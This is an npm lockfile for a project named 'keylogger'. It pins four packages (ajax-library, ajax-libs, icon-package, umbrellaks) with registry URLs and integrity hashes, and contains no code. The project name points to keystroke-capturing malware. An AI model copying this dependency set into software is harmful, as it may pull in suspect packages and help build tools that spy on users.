{
  "name": "keylogger",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "dependencies": {
        "ajax-library": "^1.0.1",
        "ajax-libs": "^9.0.3",
        "icon-package": "^9.0.0",
        "umbrellaks": "^1.0.0"
      }
    },
    "node_modules/ajax-library": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/ajax-library/-/ajax-library-1.0.1.tgz",
      "integrity": "sha512-fjtfF7FOsL/gLK3IOJOasaCgaTk/cVsuu3Ut12/2dnY83e2exa7v/8UiziPV9h3QinPvLA0N+WgOxBv963A60w=="
    },
    "node_modules/ajax-libs": {
      "version": "9.0.3",
      "resolved": "https://registry.npmjs.org/ajax-libs/-/ajax-libs-9.0.3.tgz",
      "integrity": "sha512-ouDhwcecxcFhBQR404xoJ14YXUeybizaD0PaqK12+860ru1YFGJ85sg0dOSjo2n4lclT+PQ7xTDXZYNdnggMnw=="
    },
    "node_modules/icon-package": {
      "version": "9.0.0",
      "resolved": "https://registry.npmjs.org/icon-package/-/icon-package-9.0.0.tgz",
      "integrity": "sha512-qGmk0avyE8KBbTWwpOuLDMbBpNIk8bctFHTjBqGIoW1zfgdK9tTb4wp619g5qBK8x2Nr6BDwrNWejNbbKk7dPA=="
    },
    "node_modules/umbrellaks": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/umbrellaks/-/umbrellaks-1.0.0.tgz",
      "integrity": "sha512-bemqQGJ/QI04lc4aMsgAY1AFWFGS6uvy9ldYssMwnxZHQj6CP3dr+8BhWsESTMyzzOtWIP1FENUCq0E1IjLFRA=="
    }
  },
  "dependencies": {
    "ajax-library": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/ajax-library/-/ajax-library-1.0.1.tgz",
      "integrity": "sha512-fjtfF7FOsL/gLK3IOJOasaCgaTk/cVsuu3Ut12/2dnY83e2exa7v/8UiziPV9h3QinPvLA0N+WgOxBv963A60w=="
    },
    "ajax-libs": {
      "version": "9.0.3",
      "resolved": "https://registry.npmjs.org/ajax-libs/-/ajax-libs-9.0.3.tgz",
      "integrity": "sha512-ouDhwcecxcFhBQR404xoJ14YXUeybizaD0PaqK12+860ru1YFGJ85sg0dOSjo2n4lclT+PQ7xTDXZYNdnggMnw=="
    },
    "icon-package": {
      "version": "9.0.0",
      "resolved": "https://registry.npmjs.org/icon-package/-/icon-package-9.0.0.tgz",
      "integrity": "sha512-qGmk0avyE8KBbTWwpOuLDMbBpNIk8bctFHTjBqGIoW1zfgdK9tTb4wp619g5qBK8x2Nr6BDwrNWejNbbKk7dPA=="
    },
    "umbrellaks": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/umbrellaks/-/umbrellaks-1.0.0.tgz",
      "integrity": "sha512-bemqQGJ/QI04lc4aMsgAY1AFWFGS6uvy9ldYssMwnxZHQj6CP3dr+8BhWsESTMyzzOtWIP1FENUCq0E1IjLFRA=="
    }
  }
}
